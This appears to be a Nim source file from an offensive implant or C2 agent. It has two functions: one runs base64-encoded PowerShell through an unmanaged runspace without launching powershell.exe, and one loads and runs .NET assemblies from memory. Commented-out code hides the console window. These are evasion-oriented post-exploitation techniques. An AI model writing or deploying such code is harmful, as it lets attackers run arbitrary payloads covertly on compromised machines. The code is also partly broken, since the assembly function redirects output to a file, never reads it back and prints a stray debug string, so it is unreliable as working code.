import std/[strformat, strutils]
import winim/[clr]
import os


proc execute_encoded_powershell*(encoded_command: string): string =
    var output: string
    var Automation = load("System.Management.Automation")
    var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
    var runspace = @RunspaceFactory.CreateRunspace()
    runspace.Open()
    var pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(fmt"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded_command}')))")
    pipeline.Commands.Add("Out-String")
    var results = pipeline.Invoke()
    for i in countUp(0, results.Count()-1):
        output.add($results.Item(i))
    runspace.Close()
    return output.replace("\c", "")


proc execute_assembly*(assembly_bytes: seq[byte], arguments: seq[string]): (bool, string) =

    var is_success: bool
    var output: string

    # create console for stdout writing and hide it (will fail if console exists)
    # AllocConsole()
    # SetConsoleActiveScreenBuffer(GetConsoleWindow())
    discard stdout.reopen("a.o", fmWrite)
    discard stderr.reopen("a.o", fmWrite)
    # var Stealth = FindWindowA("ConsoleWindowClass", NULL)
    # ShowWindow(Stealth,0)

    # execute assembly
    try:
        var assembly = load(assembly_bytes)
        var arr = toCLRVariant(arguments, VT_BSTR)
        assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
        is_success = true
    except:
        is_success = false
    echo "hii"

    # read output file and delete it
    # defer: removeFile(out_file)
    # output = readFile(out_file)

    return (is_success, output.replace("\c", ""))

